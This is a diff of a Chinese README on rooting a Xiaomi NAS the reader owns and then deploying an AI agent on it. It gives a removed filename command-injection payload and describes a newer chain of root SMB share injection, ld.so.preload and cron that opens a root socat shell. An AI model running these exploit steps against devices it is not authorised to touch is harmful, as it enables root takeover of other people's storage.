@@ -2,13 +2,15 @@
 
 在小米智能存储（minas / RP05 / Realtek RTD1619B / aarch64 / Yocto 5.0.3）上完成三件事的完整实操记录：
 
-1. **获取 Root SSH**：通过 WebDAV + 客户端证书（mTLS）拿到凭据，上传脚本并用命令注入触发，开启 dropbear，并完成安全加固。
+1. **获取 Root SSH**：1.0.9.462 走「mTLS 取凭据 → UCI 注入 root SMB 共享 → cron 触发」的新链路；旧固件（≤1.0.9.425）的 WebDAV/mTLS 方法保留在 `scripts/` 作参考。
 2. **部署 Hermes Agent**：用设备自带的 Docker 跑 `ghcr.io/nesquena/hermes-webui`（Web UI + 浏览器内嵌 TUI）。
 3. **接入飞书**：启用 Hermes Gateway 的 `feishu` 适配器（WebSocket 长连接），即可在飞书里直接和 Hermes 对话。
 
-> ⚠️ **前置声明**：整个过程会改动系统服务、`/etc/passwd`、写 RPMB 硬件位（固件级开关）。**仅限本人拥有或已明确授权的设备**，操作可能失去官方保修，固件升级会覆盖部分改动。请先备份重要数据。
+> ⚠️ **前置声明**：整个过程会改动系统服务、`/etc/passwd`，临时创建 `force user=root` 的 SMB 共享，并通过 `ld.so.preload` + cron 触发 root shell。**仅限本人拥有或已明确授权的设备**，操作可能失去官方保修，固件升级会覆盖部分改动。请先备份重要数据。
 >
-> 🔒 **脱敏说明**：文中的 `NAS_IP`、`CN`、`<USER>`、`<OPEN_ID>`、API Key / App Secret / SSH 公私钥均已替换为占位符。**请全部换成你自己的值**，切勿把真实密钥提交到公开仓库。
+> 📌 **版本**：Root 部分以 **1.0.9.462.F24C26D24-REL** 实测为准。462 修补了旧链路，**不要混用** `scripts/enable-ssh-macos.py`；旧固件请用该脚本，462 请用 `scripts/xiaomi-nas-root-macos.py`。
+>
+> 🔒 **脱敏说明**：文中的 `<NAS_IP>`、`<UID>`、`<USER>`、`<OPEN_ID>`、API Key / App Secret / SSH 公私钥均已替换为占位符。**请全部换成你自己的值**，切勿把真实密钥提交到公开仓库。
 
 ---
 
@@ -27,111 +29,158 @@
 | 变量 | 说明 |
 |------|------|
 | `<NAS_IP>` | NAS 局域网 IP，路由器后台 / 管理页可见 |
-| `<CN>` | 设备证书域名，形如 `nas.<uid>.<random>.0`，由设备 443 证书 CN 得到 |
-| `<USER>` | WebDAV 用户名，形如 `u<uid>`，来自 `get_pool_info` |
-| `<OPEN_ID>` | 飞书用户 open_id，用于白名单 |
+| `<UID>` | 米家数字 UID；脚本会从客户端证书自动解析，通常不用填 |
+| `<USER>` | WebDAV/NAS 用户名，形如 `u<uid>`；脚本自动获取 |
+| `<OPEN_ID>` | 飞书用户 open_id，仅 Part 3 使用 |
 
 ---
 
 ## Part 1：获取 Root SSH
 
-### 1.1 定位客户端证书
+> **适用版本**：`1.0.9.462.F24C26D24-REL`（RP05 / RTD1619B / aarch64）。
+> 1.0.9.425 及更早的「WebDAV 视频路径命令注入」已被 462 修补；旧方法仅作参考保留在 `scripts/enable-ssh-macos.py`，**462 上不要执行**。
 
-**macOS 版「小米智能存储」客户端**会把 mTLS 客户端证书打包在应用内，无需导出：
+### 1.1 新链路（3 步）
 
-```text
-/Applications/小米智能存储.app/Contents/Resources/extraResources/cert/
-  ├─ ca_chain.pem
-  ├─ <UID>_<SERIAL>_cert.pem
-  ├─ <UID>_<SERIAL>_private_key.pem
-  └─ <UID>_<SERIAL>_csr.pem
-```
+462 把旧的 WebDAV 注入链修掉了（`realpath -sm` + argv、文件操作改 D-Bus），改成：
 
-验证：
+1. **mTLS 取凭据**：用 macOS 客户端证书请求 `get_pool_info`，拿到 WebDAV 用户名/密码（端口 5000）。
+2. **UCI heredoc 注入**：WebDAV `MKCOL` 创建一个带换行符的目录名，配合 `add_samba_account` 的 `smb_mgr.sh` heredoc，写入 `force user = root` 的 `/etc` SMB 共享。
+3. **SMB 写 + cron 触发**：通过该共享写 `/etc/ld.so.preload` 和现场汇编的 aarch64 `.so`；cron 每分钟的 root 任务加载 `.so`，启动：
+   - socat root shell：`2323`
+   - dropbear：`22`
 
-```bash
-openssl x509 -in "<证书路径>/<UID>_<SERIAL>_cert.pem" -noout -subject -issuer
-# subject 形如: CN=nas.<uid>.<random>.0   issuer: O=MIOT CENTRAL GATEWAY
-```
+脚本随后修复 462 的 dropbear（见 1.5），安装 `minas-sshd.service` 并清理注入痕迹。
 
-从 NAS 的 443 端口抓设备证书域名 `<CN>`：
+### 1.2 前置条件
 
-```bash
-echo | openssl s_client -connect <NAS_IP>:443 2>/dev/null | openssl x509 -noout -subject
-```
+| 项 | 要求 |
+|---|---|
+| 设备 | 小米智能存储 RP05，固件 `1.0.9.462...` |
+| Mac | 已安装并登录「小米智能存储.app」 |
+| 证书 | App 包内 `.../extraResources/cert/`（脚本自动查找） |
+| Python | `python3` + `keystone-engine` |
+| 网络 | Mac 与 NAS 同一局域网，能访问 `<NAS_IP>:443/5000` |
+| 授权 | **仅限本人拥有或明确授权的设备**；会改 `/etc`、`/etc/passwd`，写临时 SMB 共享和 cron，可能影响保修/OTA |
 
-### 1.2 macOS 的关键坑：curl 不支持 Ed25519 客户端证书
+> 操作前备份重要数据。脚本会生成随机 SMB 口令并在结束后清理共享，但 root 改动本身是持久的。
 
-小米的客户端证书公钥是 **Ed25519**。macOS 自带 `curl`（LibreSSL / SecureTransport）**不支持 Ed25519 客户端证书**，执行 `curl --cert cert.pem --key key.pem ...` 会报 `unsupported algorithm`。
-
-**解决**：用 Python `ssl`（走机器上的 OpenSSL 3.x）做 mTLS。见仓库 `scripts/enable-ssh-macos.py`（已脱敏，替换 `<NAS_IP>`）。
-
-### 1.3 用 mTLS 拿 WebDAV 凭据
-
-对 NAS 的 443 端口发起 mTLS 请求（SNI = `<CN>`，使用客户端证书 + `ca_chain.pem` 校验服务端），调用：
-
-```text
-POST /cgi-bin/luci/filemgr/get_pool_info   body: {}
-```
-
-响应里 `data.webDAV` 给出 `username`（形如 `u<uid>`）、`password`、`port=5000`。
-
-### 1.4 上传 enable-ssh.sh 并命令注入触发
-
-把脚本 PUT 到 WebDAV：
-
-```text
-PUT https://<CN>:5000/pool0/data/enable-ssh.sh
-Authorization: Basic <username>:<password>   （并带 mTLS 客户端证书）
-```
-
-**注意：只上传不会自动执行**，还需要用命令注入文件名触发（把 `/` 用 `\57` 转义构造）：
-
-```text
-GET /pool0/video/__X2";sh $(printf '\57nas\57pool0\57<USER>\57data\57enable-ssh.sh');"__.ts
-```
-
-`enable-ssh.sh` 的核心动作（见 `scripts/enable-ssh-macos.py` 内联）：
-
-```sh
-#!/bin/sh
-[ ! -f /etc/passwd.bak ] && cp /etc/passwd /etc/passwd.bak
-mkdir -p /home/rootx/.ssh
-echo "<你的公钥>" > /home/rootx/.ssh/authorized_keys
-chmod 700 /home/rootx/.ssh && chmod 600 /home/rootx/.ssh/authorized_keys
-sed -i 's|:/root:|:/home/rootx:|' /etc/passwd
-echo 'DROPBEAR_EXTRA_ARGS=" -s"' > /etc/default/dropbear
-usermod -s /bin/sh root
-systemctl enable dropbear.socket && systemctl start dropbear.socket
-mitee_tool rpmb set ssh_en true
-touch /nas/pool0/<USER>/data/SUCCESS
-rm -f /nas/pool0/<USER>/data/enable-ssh.sh
-```
-
-### 1.5 验证 Root SSH
+### 1.3 运行
 
 ```bash
-ssh -i ~/.ssh/id_ed25519 root@<NAS_IP> id
+python3 -m venv .venv
+source .venv/bin/activate
+pip install keystone-engine
+
+# 基本用法（UID 自动从证书解析）
+python scripts/xiaomi-nas-root-macos.py <NAS_IP>
+
+# 证书不在默认路径
+python scripts/xiaomi-nas-root-macos.py <NAS_IP> --cert-dir "/path/to/cert"
+
+# 也可显式指定 UID
+python scripts/xiaomi-nas-root-macos.py <NAS_IP> --uid <UID>
+```
+
+脚本会依次：
+
+- 自动定位证书、解析 `<UID>` 与设备 SNI；
+- 取 WebDAV 凭据，创建 `force user=root` 的 `/etc` SMB 共享；
+- 写 `/etc/ld.so.preload` + `pwn.so`，等待 cron（≤90 秒）；
+- 验证 `2323` / `22`，修复 dropbear，安装并 enable `minas-sshd.service`；
+- 清理 `/etc/ld.so.preload`、`/etc/pwn.so`、`.rootpwn.sh`、staging 目录、注入的 SMB 共享/用户。
+
+成功输出类似：
+
+```text
+✅ root 获取完成
+   root shell:  nc <NAS_IP> 2323
+   SSH:        ssh -i ~/.ssh/id_ed25519_minas root@<NAS_IP>
+   SSH 可用:   是（/data/minas-ssh/dropbear + minas-sshd.service，已 enable）
+```
+
+### 1.4 验证
+
+```bash
+ssh -i ~/.ssh/id_ed25519_minas root@<NAS_IP> id
 # uid=0(root) gid=0(root) ...
+
+systemctl is-enabled minas-sshd   # enabled
+systemctl is-active minas-sshd    # active
+ss -lntp | grep ':22'
 ```
 
-> 关键点：`/root` 是**只读 erofs 分区**，所以必须把 root 的 HOME 迁到可写的 `/home/rootx`，authorized_keys 才能真正被 dropbear 读到——否则"看起来配了 key，实际不生效"。
+- `minas-sshd` 已 enable，重启后自动起。
+- socat root shell `2323` **不持久化**；重启后需要时重跑脚本。
+- root home 已迁到 `/home/rootx`（`/root` 是只读 erofs）。
+- dropbear 的登录 shell 被替换为 `/bin/bash`，命令和 PTY 均可用。
 
-### 1.6 安全加固：空密码 / 只读分区
+### 1.5 462 的 SSH 坑：dropbear 硬编码 `mi-shell`
 
-出厂状态下 **root 密码为空**，且 dropbear 默认可能带 `-B`（允许空密码）。务必：
+462 的 dropbear v2022.83 二进制里硬编码了 `/usr/sbin/mi-shell`，登录只打印 MINAS banner、忽略 `-c`，表现为「认证成功但命令没输出」。
+
+修法（脚本自动完成）：
+
+1. 把 `/usr/sbin/dropbear` 复制到可写的 `/data/minas-ssh/dropbear.new`；
+2. 同长度把 `/usr/sbin/mi-shell` 替换为 `/bin/bash` + 9 个 NUL（`/usr/sbin` 在只读 erofs，不能原地改）；
+3. 写 `/etc/systemd/system/minas-sshd.service`：
+   - `ExecStart=/data/minas-ssh/dropbear -F -p 22 -r /etc/dropbear/dropbear_rsa_host_key -s`
+   - `Conflicts=dropbear.socket`，避免和固件 socket 抢 22；
+4. `disable --now dropbear.socket`，`enable --now minas-sshd`。
+
+`-s` 表示禁用密码/空密码登录，只允许公钥。
+
+### 1.6 macOS 适配的坑
+
+上游 Linux 脚本在 macOS 直接跑会挂，主要修法：
+
+| 问题 | 修法 |
+|---|---|
+| 上游用 `mount -t cifs` | macOS 改用 `mount_smbfs` |
+| 共享名假设「30 个 M + uid」 | 实测修复后是 `etc-<uid>`，改为查 `get_samba_account` 现取 |
+| 随机 SMB 口令含 `@ ( & % ~` | `mount_smbfs` URL 不做百分号解码，改成纯字母数字 |
+| 清理依赖 GNU `timeout`/`nc` | 改用 Python socket + base64 下发 |
+| SMB 服务在 UCI 变更后重启中 | 挂载失败自动重试 6 次 |
+
+### 1.7 清理与回滚
+
+脚本成功后会自动清理注入痕迹；失败时若 root shell 已就绪也会清理。无论结果，建议按本节检查残留。**有意保留**：
+
+- `/home/rootx/.ssh/authorized_keys`
+- `/etc/dropbear/authorized_keys`
+- `/data/minas-ssh/dropbear` + `/etc/systemd/system/minas-sshd.service`
+- `/etc/passwd` 中 root home → `/home/rootx`
+
+回滚 SSH：
 
 ```bash
-# 1) 禁用空密码/密码登录（-s）
-echo 'DROPBEAR_EXTRA_ARGS=" -s"' > /etc/default/dropbear
-# 2) 设非空 root 密码（纵深防御）
-printf 'root:<强密码>\n' | chpasswd
-# 3) 确认只提供 publickey
-ssh -o PreferredAuthentications=none -o BatchMode=yes root@<NAS_IP> exit
-# 期望: Permission denied (publickey)   → 无 password 通道
+systemctl disable --now minas-sshd
+rm -rf /data/minas-ssh
+rm -f /etc/systemd/system/minas-sshd.service
+systemctl daemon-reload
+rm -f /home/rootx/.ssh/authorized_keys /etc/dropbear/authorized_keys
+sed -i 's|:/home/rootx:|:/root:|' /etc/passwd
 ```
 
-**固件升级会重置** `/etc/passwd`（HOME 回 `/root`）和 `/etc/default/dropbear`（丢 `-s`）。写一个恢复脚本 `scripts/fix-ssh-home.sh` 放到可写分区 `/data/`，升级后执行一次即可。
+> `/root` 是只读 erofs；改回 `/root` 后公钥认证可能失效。需要再用时重跑脚本即可。
+> 如果脚本中途被打断，先检查 `/etc/ld.so.preload` 是否残留；它会让全机动态程序加载 `pwn.so`，确认后删除。
+
+### 1.8 安全加固
+
+`minas-sshd` 已带 `-s`，只允许公钥。建议再验证一次：
+
+```bash
+ssh -o PreferredAuthentications=none -o BatchMode=yes root@<NAS_IP> exit
+# 期望：Permission denied (publickey)
+```
+
+- 私钥只留本机（默认 `~/.ssh/id_ed25519_minas`），不要提交到仓库。
+- 出厂 root 密码可能为空；`-s` 已封死密码通道。如需额外纵深，可设非空密码，但不要开启密码登录。
+- 不要把 `2323` 暴露到公网；脚本只在局域网使用。
+
+### 1.9 旧固件（≤1.0.9.425）
+
+旧固件的 mTLS + WebDAV 视频路径注入链仍在 `scripts/enable-ssh-macos.py`，仅作历史参考；**462 上不要执行**，会被 `realpath -sm` / D-Bus 修补挡住。
 
 ---
 
@@ -260,13 +309,14 @@ docker exec --user 1024:<NAS_USER_GID> -e HERMES_HOME=/home/hermeswebui/.hermes 
 | `PermissionError: gateway.lock` | 属主不匹配。容器以非 root 跑时，`chown -R 1024:1024 /data/hermes/home` 并清掉 root 属主的 `*.lock` |
 | 容器读不到 NAS 照片 | 没挂 pool，或容器用户不在 NAS 用户组。用 `--user 1024:<NAS_USER_GID>` 并加 `-v /nas/pool0/<USER>/data:/nas/pool` |
 | PyPI / Docker Hub 慢 | 用清华源 / ghcr.nju.edu.cn，或用 Mac crane 中转 |
-| 固件升级后 SSH key 失效 | 执行 `sh /data/fix-ssh-home.sh`（恢复 HOME + authorized_keys + `-s`） |
-| 空密码仍能登录 | `/etc/default/dropbear` 丢了 `-s`，重新写入并重启 dropbear |
+| 固件升级后 SSH key 失效 | 462 重跑 `python3 scripts/xiaomi-nas-root-macos.py <NAS_IP>`；旧固件执行 `sh /data/fix-ssh-home.sh` |
+| 空密码仍能登录 | 462 检查 `minas-sshd` 的 `ExecStart` 是否带 `-s`；旧固件检查 `/etc/default/dropbear` |
 
 ## 参考脚本
 
-- [`scripts/enable-ssh-macos.py`](scripts/enable-ssh-macos.py) — macOS 端 mTLS 取凭据 + 上传触发，全流程脚本（替换 `<NAS_IP>`）。
-- [`scripts/fix-ssh-home.sh`](scripts/fix-ssh-home.sh) — 固件升级后恢复 SSH 的加固脚本。
+- [`scripts/xiaomi-nas-root-macos.py`](scripts/xiaomi-nas-root-macos.py) — **1.0.9.462 一键 root（macOS 适配）**，含 dropbear 修复与 `minas-sshd` 安装。
+- [`scripts/enable-ssh-macos.py`](scripts/enable-ssh-macos.py) — 旧固件（≤1.0.9.425）的 mTLS + WebDAV 方法，仅作历史参考；**462 不要用**。
+- [`scripts/fix-ssh-home.sh`](scripts/fix-ssh-home.sh) — 旧固件的 SSH 加固/恢复脚本；462 请重跑主脚本。
 
 ---
 
